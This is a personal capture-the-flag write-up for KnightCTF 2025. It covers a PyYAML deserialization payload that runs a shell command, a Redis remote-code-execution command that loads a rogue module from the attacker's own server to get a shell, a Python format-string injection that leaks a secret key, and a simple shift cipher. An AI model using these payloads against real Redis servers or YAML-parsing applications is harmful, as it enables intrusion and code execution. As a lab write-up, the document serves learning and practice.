+++
title = 'KnightCTF 2025 Personal Writeup'
date = 2025-01-21T16:04:44+08:00
summary = "Full of guessing. No idea what the organizers are thinking."
math = true
draft = false
tags = ['Writeup', 'KCTF']
categories = ['CTF']
+++

## Web
### Baby Injection

Python's YAML lib `PyYaml` unserialization flaw. The root cause is that
`yaml.load` will deserialize the input string into a Python object, for example

```yaml
person:
  !python/object:__main__.Person
  name: Alice
  age: 25
```

will be loaded into `{'person': <__main__.Person object at 0x000001BA17055390>}`.

Thus, we can exploit this to execute arbitrary code by injecting

```yaml
!!python/object/apply:subprocess.check_output [["ls"]]
```

After base64 encoding, we got the flag from the filename.

### Luana

Redis RCE. Get shell by https://github.com/Ridter/redis-rce

Download `exp.so` from https://github.com/n0b0dyCN/redis-rogue-server

```bash
python3 redis-rce.py -r 172.105.121.246 -p 6379 -L <your-server-ip> -P <your-server-port> -f exp.so
```

### KnightCal

Kinda weird.

The website stores the result of calculation through a mapping from digits to character.
For example, inputing `1234567890` will get the content of `ldbhgcfeai.txt`. So it's ez to guess that
we need to read `flag.txt` which is `7195`.

## RE

### Knight's Droid

A simple APK RE, open with jadx. First glance gives `SecretKeyVerifier.verifyFlag` in `MainActivity`.

Encoded text was `GYPB{_ykjcnwp5_GJECDP_u0q_c0p_uKqN_Gj1cd7_zN01z_}` and the encryption

```java
private static String droidMagic(String input, int droidTask) {
    int droidTask2 = ((droidTask % 26) + 26) % 26;
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        if (Character.isUpperCase(c)) {
            int originalPos = c - 'A';
            int newPos = (originalPos + droidTask2) % 26;
            sb.append((char) (newPos + 65));
        } else if (Character.isLowerCase(c)) {
            int originalPos2 = c - 'a';
            int newPos2 = (originalPos2 + droidTask2) % 26;
            sb.append((char) (newPos2 + 97));
        } else {
            sb.append(c);
        }
    }
    return sb.toString();
}
```

It's a ROT13 cipher, and brute forcing the key will get the flag.

## Crypto

### Reflections in the Random

Well the hint is a bit misleading. It's indeed a base64 encoded string. After xored with the key,
we got a string similar to the flag, only an extra reversing needed.

## PWN

### Knight's Secret

It's not a PWN. Hint gives that 

> Example of a safe template: 'Greetings, {person_obj.name}, the {person_obj.role}.'

So apparently there's some kind of template injection. Playing around 

```python
Enter your secret: {person_obj.__init__}
Output: <bound method Person.__init__ of <__main__.Person object at 0x71aedc66e420>>
```

and finally

```python
Enter your secret: {person_obj.__init__.__globals__}
Output: {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x71aedc663920>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/challenge/challenge.py', '__cached__': None, 'CONFIG': {'KEY': '_KNIGHTSECRET2025_'}, 'Person': <class '__main__.Person'>, 'fun': <function fun at 0x71aedc64a340>, 'main': <function main at 0x71aedc428d60>}
```

This is it. The secret is `_KNIGHTSECRET2025_`.
